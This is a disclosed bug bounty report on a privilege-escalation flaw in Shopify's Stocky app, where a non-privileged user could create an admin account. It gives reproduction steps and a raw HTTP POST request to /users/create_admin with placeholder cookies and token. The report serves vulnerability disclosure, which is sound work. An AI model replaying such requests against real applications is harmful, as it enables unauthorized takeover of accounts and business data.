# A non-privileged user may create an admin account in Stocky

## Report Details
- **Report ID**: 1245736
- **URL**: https://hackerone.com/reports/1245736
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-06-27T14:57:46.064Z
- **Disclosed**: 2021-11-25T20:43:16.403Z

## Reporter
- **Username**: stapia
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
##Summary:
A non-privileged Stocky user (created within Stocky)  may be able to create a new admin user.

##Steps to reproduce:
1.Create a non-privileged user in Stocky, don't give admin privileges to that user.
2.Login with the non-privileged user and go to https://stocky.shopifyapps.com/users/me, update any field and intercept the request.
3. Make a POST request to /users/create_admin with the Cookies and Token that you intercepted from the previous steps.
4. Log out from Stocky and Login with the new user, you will have admin privileges.

```
POST /users/create_admin HTTP/2
Host: stocky.shopifyapps.com
Cookie:[REPLACE COOKIES]
Content-Length: 277
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="91", " Not;A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://stocky.shopifyapps.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://stocky.shopifyapps.com/preferences/users
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

utf8=%E2%9C%93&authenticity_token=[REPLACE TOKEN]&user%5Bfirst_name%5D=██████&user%5Blast_name%5D=████████&user%5Bemail%5D=██████████&commit=Create+%26+Login
```

## Impact

A non-privileged Stocky user may get full admin privileges within the app, which would allow that user to update the inventory, stock, vendors, place purchase orders, etc, even if that user doesn't have those privileges within Shopify.

## Attachments
No attachments
